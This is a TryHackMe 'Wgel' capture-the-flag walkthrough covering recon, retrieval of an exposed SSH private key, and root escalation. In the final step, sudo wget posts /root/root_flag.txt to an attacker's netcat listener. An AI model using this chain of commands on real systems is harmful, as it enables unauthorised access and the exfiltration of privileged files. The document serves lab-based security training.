# TryHackMe - Wgel CTF Walkthrough

**Solved by:** Prince  
**Date:** 2025-09-30  
**Difficulty:** Easy  

---

## 📝 Room Contents
- **Task 1:** User flag  
- **Task 2:** Root flag  

---

## 🔧 Tools Used
- Nmap  
- Dirsearch  
- Gobuster  
- GTFOBins  

---

## 🚩 Walkthrough

### Step 1: Initial Recon and Port Scan
We begin with a port scan using `nmap`:

```bash
nmap -sV -sC -vvv -oN nmap-scan <IP>

Scan Results:

22/tcp → SSH

80/tcp → HTTP (Web Server)


With SSH and HTTP open, we first investigate the web server.


---

Step 2: Exploring the Web Server

Browsing to http://<IP>/, we see a career opportunities website.
To find hidden directories, we brute-force with Gobuster:

gobuster dir -u http://<IP>/ -w /path/to/wordlist

Discovery: A hidden directory .ssh/

Visiting http://<IP>/.ssh/ revealed an id_rsa private key.


---

Step 3: SSH Access Using id_rsa

1. Download the id_rsa file.


2. Fix permissions:

chmod 600 id_rsa


3. Log into the target machine via SSH:

ssh -i id_rsa jessie@<IP>




---

Step 4: Obtaining the User Flag

Once inside as jessie, navigate to the home directory:

cd /home/jessie
cat user_flag.txt

✅ User flag captured.


---

Step 5: Privilege Escalation

Check sudo permissions:

sudo -l

It shows that wget can be run with elevated privileges.


---

Step 6: Exploiting wget to Gain Root Flag

We can use wget to read the root flag file by exfiltrating it to our listener.

1. Start a netcat listener on your local machine:

nc -lvnp 1234


2. On the target, run:

sudo wget --post-file=/root/root_flag.txt http://<YOUR-IP>:1234


3. The contents of /root/root_flag.txt will be sent to your netcat terminal.



✅ Root flag captured.


---

🎯 Summary

Performed initial recon with nmap.

Found .ssh/ directory via Gobuster → retrieved id_rsa.

Gained SSH access as user jessie.

Captured User Flag.

Used wget privilege escalation to capture the Root Flag.



---

📌 Flags

User Flag: 🎉

Root Flag: 🔑
